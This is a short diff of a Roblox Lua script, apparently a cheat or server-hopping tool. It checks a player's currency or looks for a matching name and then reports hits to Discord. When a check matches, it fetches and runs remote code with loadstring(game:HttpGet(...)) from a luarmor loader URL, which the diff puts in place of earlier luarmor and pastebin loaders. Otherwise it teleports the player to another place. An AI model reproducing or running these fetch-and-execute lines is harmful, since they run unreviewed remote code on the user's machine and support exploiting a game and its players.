@@ -223,6 +223,7 @@ local meetsMinimum, highestAmount, currencyTextLabel = CheckCurrency(minimum)
 
 
 local hasMatch = meetsMinimum or nameFound
+local mainScript = "https://api.luarmor.net/files/v3/loaders/ac88f99f2b292242281d052a71f08a70.lua"
 
 if meetsMinimum then
 	print("Ooooo we got something")
@@ -234,10 +235,7 @@ if meetsMinimum then
 	sound:Play()
 
 	task.spawn(function()
-		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/53325754de16c11fbf8bf78101c1c881.lua"))()
-	end)
-	task.spawn(function()
-		loadstring(game:HttpGet("https://pastebin.com/raw/fpkbJgyq"))()
+		loadstring(game:HttpGet(mainScript))()
 	end)
 
 	DiscordNotificationCURRENCY(currencyTextLabel)
@@ -252,11 +250,7 @@ elseif nameFound then
 	sound:Play()
 
 	task.spawn(function()
-		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/53325754de16c11fbf8bf78101c1c881.lua"))()
-		loadstring(game:HttpGet("https://pastebin.com/raw/fpkbJgyq"))()
-	end)
-	task.spawn(function()
-		loadstring(game:HttpGet("https://pastebin.com/raw/fpkbJgyq"))()
+		loadstring(game:HttpGet(mainScript))()
 	end)
 
 	DiscordNotificationNAME(matchedName)
@@ -368,5 +362,6 @@ else
 		game["Teleport Service"]:Teleport(109983668079237, game.Players.LocalPlayer)
 	end
 end
+
 
 
